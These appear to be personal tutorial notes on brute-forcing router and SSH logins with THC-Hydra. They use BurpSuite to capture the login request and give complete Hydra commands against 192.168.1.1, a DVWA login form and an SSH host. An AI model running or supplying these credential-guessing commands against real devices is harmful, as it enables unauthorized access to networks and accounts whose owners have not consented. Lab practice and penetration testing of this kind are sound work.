Once on or in a network, you can use THC-Hydra to brute-force most routers.
The trick here is figuring out what type of login the router uses, and
properly conveying that to Hydra. We'll use an additional tool, BurpSuite,
to figure out exactly what-type of login a router uses. 

BurpSuite -> A browser proxy, used to deeply sniff anything that comes from 
          or goes to a local browser.
          
BurpSuite seems very intimitating at-first, and it has lots of options for 
all sorts of things that we won't be using. Simply open it up, head over to
"Proxy". Then ensure "Intercept is on".

Back to your browser, where you'll change your proxy settings to 127.0.0.1:8080

Now hit up the router login page, and watch the request come up on BurpSuite.

Now search through the requests, and find one that looks like something Hydra
can deal with:

http[s]-{head|get|post}
http[s]-{get|post}-form
http-proxy 
http-proxy-urlenum 

Then try!

-l -> username, can use '-L' for using lists
-P -> wordlist.txt, can use '-p' for just one
http-get -> one of the types Hydra can deal with
192.168.1.1 -> router's ip

> hydra -l admin -P ./dictionary.txt 192.168.1.1 http-get

http-post-form -> type of login page
/dvwa/login.php -> relative page address
username -> field name for username
^USER^ -> tell Hydra where to put username
password -> field name for password
^PASS^ -> tell Hydra where to put passwrod
Login

// Chris's notes on using THC Hydra

# Login Page where
# http-post-form is type of request (seen in burpsuite)
# /dvwa/login.php is page address (ie: 192.168.1.1/dvwa/login.php)
# username is field name for username (seen in burpsuite and probably on page)
# ^USER^ tells hydra to put the username there
# same things with the password stuff
# Login tells hydra that this is for failed logins
# Login failed tells hydra that this is what those failed logins look like(burp)
hydra -l admin -p password 192.168.1.1 http-post-form 
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

# Cracking ssh login with hydra w/dictionary
hydra -l admin -p password 192.168.1.2 ssh
